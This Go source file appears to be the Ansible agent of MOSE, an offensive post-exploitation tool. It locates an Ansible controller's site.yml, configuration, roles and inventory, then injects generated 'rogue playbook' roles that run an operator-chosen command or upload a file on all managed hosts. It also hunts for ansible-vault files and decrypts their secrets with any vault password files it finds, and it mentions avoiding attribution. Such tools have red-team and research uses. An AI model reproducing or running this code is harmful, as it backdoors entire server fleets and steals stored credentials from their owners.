// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"

	"github.com/ghodss/yaml"
	"github.com/gobuffalo/packr/v2"
	utils "github.com/l50/goutils"
	"github.com/master-of-servers/mose/pkg/moseutils"
)

type command struct {
	Cmd      string
	CmdName  string
	FileName string
	FilePath string
}

type ansibleFiles struct {
	cfgFile      string
	hostFiles    []string
	hosts        []string
	playbookDirs []string
	siteFile     string
	vaultFile    string
	uid          int
	gid          int
}

type ansible []struct {
	Name         string                 `json:"name,omitempty"`
	Connection   interface{}            `json:"connection,omitempty"`
	Vars         map[string]interface{} `json:"vars,omitempty,flow"`
	Remote       string                 `json:"remote_user,omitempty"`
	BecomeMethod string                 `json:"become_method,omitempty"`
	Hosts        string                 `json:"hosts,omitempty"`
	Become       bool                   `json:"become,omitempty"`
	GatherFacts  string                 `json:"gather_facts,omitempty"`
	Include      string                 `json:"include,omitempty"`
	Tags         []interface{}          `json:"tags,omitempty,flow"`
	Roles        []interface{}          `json:"roles,flow,omitempty"`
	Tasks        []interface{}          `json:"tasks,flow,omitempty"`
}

var (
	a                = CreateAgent()
	ansibleBackupLoc = a.AnsibleBackupLoc
	cleanup          bool
	cleanupFile      = a.CleanupFile
	debug            = a.Debug
	files            = ansibleFiles{
		cfgFile:      "",
		hostFiles:    []string{},
		playbookDirs: []string{},
		siteFile:     "",
		vaultFile:    "",
		uid:          -1,
		gid:          -1,
	}
	osTarget       = a.OsTarget
	ansibleRole    = a.PayloadName
	uploadFileName = a.FileName
	uploadFilePath = a.RemoteUploadFilePath
	specific       bool
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
	flag.Parse()
}

func doCleanup(siteLoc string) {
	moseutils.TrackChanges(cleanupFile, cleanupFile)
	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run? ", osTarget)
	if err != nil {
		log.Fatalln(err)
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)

	path := siteLoc
	if ansibleBackupLoc != "" {
		path = filepath.Join(ansibleBackupLoc, filepath.Base(siteLoc))
	}

	path = path + ".bak.mose"

	if !moseutils.FileExists(path) {
		moseutils.Info("Backup file %s does not exist, skipping", path)
	}
	ans2 := false
	if !ans {
		ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", siteLoc, path), osTarget)
		if err != nil {
			log.Fatal("Quitting...")
		}
	}
	if ans || ans2 {
		moseutils.CpFile(path, siteLoc)
		os.Remove(path)
	}
	os.Exit(0)
}

func getSiteFile() string {
	var siteLoc string
	fileList, _ := moseutils.GetFileAndDirList([]string{"/"})
	for _, file := range fileList {
		if strings.Contains(file, "site.yml") && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
			siteLoc = file
		}
	}
	if siteLoc == "" {
		moseutils.ErrMsg("Unable to locate a site.yml file.")
	}
	return siteLoc
}

func getCfgFile() string {
	var cfgLoc string
	fileList, _ := moseutils.GetFileAndDirList([]string{"/"})
	for _, file := range fileList {
		matched, _ := regexp.MatchString(`ansible.cfg$`, file)
		if matched && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") &&
			!strings.Contains(file, "test") {
			cfgLoc = file
		}
	}
	if cfgLoc == "" {
		moseutils.ErrMsg("Unable to locate an ansible.cfg file.")
	}
	return cfgLoc
}

func getPlaybooks() []string {
	locations := make(map[string]bool)
	var playbookDirs []string

	_, dirList := moseutils.GetFileAndDirList([]string{"/"})
	for _, dir := range dirList {
		d := filepath.Dir(dir)
		if strings.Contains(d, "roles") && !strings.Contains(d, "~") &&
			!strings.Contains(d, ".bak") && !strings.Contains(d, "#") &&
			!strings.Contains(d, "tasks") && !strings.Contains(d, "vars") {

			if !locations[d] && filepath.Base(d) == "roles" {
				locations[d] = true
			}
		}
	}
	for loc := range locations {
		playbookDirs = append(playbookDirs, loc)
	}

	return playbookDirs
}

func getHostFileFromCfg() (bool, string) {
	cfgFile, err := moseutils.File2lines(files.cfgFile)
	if err != nil {
		moseutils.ErrMsg("Unable to read %v because of %v", files.cfgFile, err)
	}
	for _, line := range cfgFile {
		matched, _ := regexp.MatchString(`^inventory.*`, line)
		if matched {
			if debug {
				log.Printf("Found inventory specified in ansible.cfg: %v", files.cfgFile)
			}
			inventoryPath := strings.TrimSpace(strings.SplitAfter(line, "=")[1])
			path, err := moseutils.CreateFilePath(inventoryPath, filepath.Dir(files.cfgFile))
			if err != nil {
				moseutils.ErrMsg("Unable to generate correct path from input: %v %v", inventoryPath, filepath.Dir(files.cfgFile))
			}
			return true, path
		}
	}
	return false, ""
}

func getHostFiles() []string {
	var hostFiles []string

	// Check if host file specified in the ansible.cfg file
	found, hostFile := getHostFileFromCfg()
	if found {
		hostFiles = append(hostFiles, hostFile)
	}

	fileList, _ := moseutils.GetFileAndDirList([]string{"/etc/ansible"})
	for _, file := range fileList {
		if strings.Contains(file, "hosts") && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
			hostFiles = append(hostFiles, file)
		}
	}
	return hostFiles
}

func getManagedSystems() []string {
	var hosts []string
	for _, hostFile := range files.hostFiles {
		// Get the contents of the hostfile into a slice
		contents, err := moseutils.File2lines(hostFile)
		if err != nil {
			moseutils.ErrMsg("Unable to read %v because of %v", hostFile, err)
		}
		// Add valid lines with IP addresses or hostnames to hosts
		for _, line := range contents {
			ip, _ := regexp.MatchString(`^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$`, line)
			validHostname, _ := regexp.MatchString(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`, line)
			if ip || validHostname {
				hosts = append(hosts, line)
			}
		}
	}
	return hosts
}

func createPlaybookDirs(playbookDir string, ansibleCommand command) {
	var err error
	var fileDir string
	err = os.MkdirAll(filepath.Join(playbookDir, ansibleCommand.CmdName, "tasks"), os.ModePerm)

	if err != nil {
		log.Printf("Error creating the %s playbook directory: %v", playbookDir, err)
	}

	if uploadFileName != "" {
		fileDir = filepath.Join(playbookDir, ansibleCommand.CmdName, "files")
		err = os.MkdirAll(fileDir, os.ModePerm)

		if err != nil {
			log.Printf("Error creating the %s playbook directory: %v", fileDir, err)
		}

		_, err := moseutils.TrackChanges(cleanupFile, uploadFilePath)

		if err != nil {
			moseutils.ErrMsg("Error tracking changes: ", err)
		}

		moseutils.CpFile(uploadFilePath, filepath.Join(fileDir, filepath.Base(uploadFileName)))
		if err := os.Chmod(filepath.Join(fileDir, filepath.Base(uploadFileName)), 0644); err != nil {
			log.Printf("Failed to set the permissions for %v: %v", uploadFileName, err)
		}
		moseutils.Msg("Successfully copied and set permissions for %s", filepath.Join(fileDir, filepath.Base(uploadFileName)))
	}
}

func backupSiteFile() {
	path := files.siteFile
	// If a backup location is specified in the settings.json, use it
	if ansibleBackupLoc != "" {
		var err error
		err = os.MkdirAll(ansibleBackupLoc, os.ModePerm)

		if err != nil {
			log.Printf("Error creating the path (%s) for the backup: %v", path, err)
		}

		path = filepath.Join(ansibleBackupLoc, filepath.Base(files.siteFile))
	}
	if !moseutils.FileExists(path + ".bak.mose") {
		moseutils.CpFile(files.siteFile, path+".bak.mose")
		if files.uid != -1 && files.gid != -1 {
			err := os.Chown(path+".bak.mose", files.uid, files.gid)
			if err != nil {
				moseutils.ErrMsg("issues changing owner of backup file")
			}
		}
	} else {
		moseutils.ErrMsg("Backup of the site.yml file already exists (%v.bak.mose), moving on.", path)
	}
}

func generatePlaybooks() {
	ansibleCommand := command{
		CmdName:  a.PayloadName,
		Cmd:      a.Cmd,
		FileName: uploadFileName,
		FilePath: uploadFilePath,
	}
	for _, playbookDir := range files.playbookDirs {
		var s string
		createPlaybookDirs(playbookDir, ansibleCommand)

		box := packr.New("Ansible", "../../../templates/ansible")

		s, err := box.FindString("ansiblePlaybook.tmpl")

		if err != nil {
			log.Fatalf("Error reading the template to create a playbook: %v, exiting...", err)
		}

		if uploadFileName != "" {
			s, err = box.FindString("ansibleFileUploadPlaybook.tmpl")

			if err != nil {
				log.Fatalf("Error reading the file upload template to create a playbook: %v, exiting...", err)
			}
		}

		// Parse the template
		t, err := template.New("ansiblePlaybook").Parse(s)

		if err != nil {
			log.Fatalf("Error creating the template representation of the ansible playbook: %v, exiting...", err)
		}

		// Create the main.yml file
		f, err := os.Create(filepath.Join(playbookDir, ansibleCommand.CmdName, "tasks", "main.yml"))

		if err != nil {
			log.Fatalf("Error creating the main.yml file: %v, exiting...", err)
		}

		// Write the contents of ansibleCommand into the main.yml file generated previously
		err = t.Execute(f, ansibleCommand)

		if err != nil {
			log.Fatalf("Error injecting the ansibleCommand content into the playbook template: %v", err)
		}

		f.Close()
		if debug {
			log.Printf("Creating rogue playbook %s", playbookDir)
		}
		moseutils.Msg("Successfully created the %s playbook at %s", ansibleCommand.CmdName, playbookDir)

		_, err = moseutils.TrackChanges(cleanupFile, filepath.Join(playbookDir, ansibleCommand.CmdName))

		if err != nil {
			moseutils.ErrMsg("Error tracking changes: ", err)
		}

		if debug {
			log.Printf("Attempting to change ownership of directory")
		}
		if files.uid != -1 && files.gid != -1 {
			err := moseutils.ChownR(filepath.Join(playbookDir, ansibleCommand.CmdName), files.uid, files.gid)
			if err != nil {
				moseutils.ErrMsg("issues changing owner of backup file")
			}
		}
	}
}

func writeYamlToSite(siteYaml ansible) {
	marshalled, err := yaml.Marshal(&siteYaml)
	if err != nil {
		log.Fatal(err)
	}

	err = moseutils.WriteBytesToFile(files.siteFile, marshalled, 0644)
	if err != nil {
		log.Fatalf("Error writing %v to %v because of: %v, exiting.", marshalled, files.siteFile, err)
	}
	moseutils.Msg("Added backdoored code to %s", files.siteFile)
}

func validateIndicies(data ansible) map[int]bool {
	validIndices := make(map[int]bool, 0)
	for i, hosts := range data {
		roles := make([]string, 0)
		if hosts.Include == "" {
			for _, item := range hosts.Roles {
				switch r := item.(type) {
				case map[string]interface{}:
					roles = append(roles, r["role"].(string))
				case string:
					roles = append(roles, r)
				default:
					if debug {
						log.Println("Should not make it here in validateIndicies")
					}
				}
			}
			moseutils.Msg("[%v] Name: %v, Hosts: %v, Roles: %v", i, hosts.Name, hosts.Hosts, roles)
			validIndices[i] = true
		}
	}
	return validIndices
}

func backdoorSiteFile() {
	var hosts []string
	hostAllFound := false

	bytes, err := moseutils.ReadBytesFromFile(files.siteFile)
	if err != nil {
		log.Fatal(err)
	}

	unmarshalled := ansible{}
	err = yaml.Unmarshal(bytes, &unmarshalled)
	if err != nil {
		log.Fatal(err)
	}

	for _, host := range unmarshalled {
		hosts = append(hosts, host.Hosts)
		if strings.Compare(host.Hosts, "all") == 0 {
			hostAllFound = true
		}
	}

	if hostAllFound {
		if debug {
			log.Println("hosts:all found")
		}
		if ans, err := moseutils.AskUserQuestion("Would you like to target all managed hosts? ", a.OsTarget); ans && err == nil {
			for i, item := range unmarshalled {
				if strings.Compare(item.Hosts, "all") == 0 {
					moseutils.Msg("Existing configuration for all hosts found, adding rogue playbook to associated roles")
					if unmarshalled[i].Roles == nil {
						unmarshalled[i].Roles = make([]interface{}, 0)
					}
					unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
					writeYamlToSite(unmarshalled)
					return
				}
			}
		} else if err != nil {
			log.Fatalf("Quitting...")
		}
	}

	if !hostAllFound {
		if debug {
			log.Printf("No existing configuration for all founds host in %v", files.siteFile)
		}
		roles := make([]interface{}, 0)
		roles = append(roles, ansibleRole)
		if ans, err := moseutils.AskUserQuestion("Would you like to target all managed nodes? ", a.OsTarget); ans && err == nil {
			newItem := ansible{{
				a.PayloadName,
				nil,
				nil,
				"",
				"",
				"all",
				true,
				"",
				"",
				nil,
				roles,
				nil,
			}}
			unmarshalled = append(unmarshalled, newItem[0])
			writeYamlToSite(unmarshalled)
			return
		} else if err != nil {
			log.Fatalf("Error targeting all managed nodes: %v, exiting.", err)
		}
	}
	moseutils.Info("The following roles were found in the site.yml file: ")
	validIndices := validateIndicies(unmarshalled)

	if ans, err := moseutils.IndexedUserQuestion("Provide the index of the location that you want to inject into the site.yml (ex. 1,3,...):", a.OsTarget, validIndices, func() { validateIndicies(unmarshalled) }); err == nil {
		for i := range unmarshalled {
			// Check if the specified location is in the answer
			if ans[i] {
				if unmarshalled[i].Roles == nil {
					unmarshalled[i].Roles = make([]interface{}, 0)
				}
				unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
			}
		}
	} else if err != nil {
		log.Fatalf("Failure injecting into the site.yml file: %v, exiting.", err)
	}
	writeYamlToSite(unmarshalled)
}

func findVaultSecrets() {
	found, fileLoc := moseutils.FindFile("ansible-vault", []string{"/bin", "/usr/bin", "/usr/local/bin", "/etc/anisble"})
	if found {
		envPass := os.Getenv("ANSIBLE_VAULT_PASSWORD_FILE")
		envFileExists, envFile := getVaultPassFromCfg()

		ansibleFiles, _ := moseutils.FindFiles([]string{"/etc/ansible", "/root", "/home", "/opt", "/var"}, []string{".yaml", ".yml"}, []string{"vault"}, []string{})

		if len(ansibleFiles) == 0 {
			moseutils.ErrMsg("Unable to find any yaml files")
			return
		}
		// Matches for secrets
		reg := regexp.MustCompile(`(?ms)\$ANSIBLE_VAULT`)
		// Translate secrets on the fly
		for _, file := range ansibleFiles {
			matches := moseutils.GrepFile(file, reg)
			if debug {
				log.Printf("Checking if secret in file %v", file)
			}
			if len(matches) > 0 {
				if envPass != "" {
					moseutils.Msg("Found secret(s) in file: %s", file)
					res, err := utils.RunCommand(fileLoc, "view",
						"--vault-password-file",
						envPass,
						file)

					if err != nil {
						moseutils.ErrMsg("Error running command: %s view %s %s %v", fileLoc, envPass, file, err)
					}
					if !strings.Contains(res, "ERROR!") {
						moseutils.Msg("%s", res)
					}
				}

				if envFileExists && envFile != envPass {
					moseutils.Msg("Found secret(s) in file: %s", file)
					res, err := utils.RunCommand(fileLoc, "view",
						"--vault-password-file",
						envFile,
						file)

					if err != nil {
						moseutils.ErrMsg("Error running command: %s view --vault-password-file %s %s %v", fileLoc, envFile, file, err)
					}
					if !strings.Contains(res, "ERROR!") {
						moseutils.Msg("%s", res)
					}
				}
			}
		}
	}
}

func getVaultPassFromCfg() (bool, string) {
	cfgFile, err := moseutils.File2lines(files.cfgFile)
	if err != nil {
		moseutils.ErrMsg("Unable to read %v because of %v", files.cfgFile, err)
	}
	for _, line := range cfgFile {
		matched, _ := regexp.MatchString(`^vault_password_file.*`, line)
		if matched {
			if debug {
				log.Printf("Found vault_password_file specified in ansible.cfg: %v", files.cfgFile)
			}
			vaultPath := strings.TrimSpace(strings.SplitAfter(line, "=")[1])
			path, err := moseutils.CreateFilePath(vaultPath, filepath.Dir(files.cfgFile))
			if err != nil {
				moseutils.ErrMsg("Unable to generate correct path from input: %v %v", vaultPath, filepath.Dir(files.cfgFile))
			}
			return true, path
		}
	}
	return false, ""
}

func main() {
	if uploadFileName != "" {
		moseutils.CpFile(uploadFileName, uploadFilePath)
		_, err := moseutils.TrackChanges(cleanupFile, uploadFileName)

		if err != nil {
			moseutils.ErrMsg("Error tracking changes: ", err)
		}
	}

	// Find site.yml
	files.siteFile = getSiteFile()
	if debug {
		log.Printf("Site file: %v", files.siteFile)
	}

	uid, gid, err := moseutils.GetUIDGid(files.siteFile)
	if err != nil {
		moseutils.ErrMsg("Error retrieving uid and gid of file, will default to root")
	}

	files.uid = uid
	files.gid = gid

	if cleanup {
		doCleanup(files.siteFile)
	}

	// Find ansible.cfg
	files.cfgFile = getCfgFile()
	if debug {
		log.Printf("Ansible config file location: %v", files.cfgFile)
	}

	// Find where playbooks are located on the target system
	files.playbookDirs = getPlaybooks()
	if debug {
		log.Printf("Directories with playbooks: %v", files.playbookDirs)
	}

	// Find host files
	files.hostFiles = getHostFiles()
	if debug {
		log.Printf("Host files found: %v", files.hostFiles)
	}

	// Parse managed systems from the hosts files found previously
	files.hosts = getManagedSystems()
	if len(files.hosts) > 0 {
		moseutils.Info("The following managed systems were found: %v", files.hosts)
	}

	if files.siteFile != "" {
		if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", a.OsTarget); ans && err == nil {
			backupSiteFile()
		} else if err != nil {
			log.Fatal("Exiting...")
		}
	}

	// Create rogue playbooks using ansiblePlaybook.tmpl
	generatePlaybooks()

	moseutils.Msg("Backdooring %v to run %s on all managed systems, please wait...", files.siteFile, a.Cmd)
	backdoorSiteFile()

	if debug {
		fmt.Printf("Changing owner of the backup file to uid %v\n", files.uid)
	}
	if files.uid != -1 && files.gid != -1 {
		err := os.Chown(files.siteFile, files.uid, files.gid)
		if err != nil {
			log.Printf("Failed to change owner of the backup file: %v\n", err)
		}
	}

	// find secrets is ansible-vault is installed
	moseutils.Info("Attempting to find secrets, please wait...")
	findVaultSecrets()
	moseutils.Msg("MOSE has finished, exiting.")
	os.Exit(0)
}
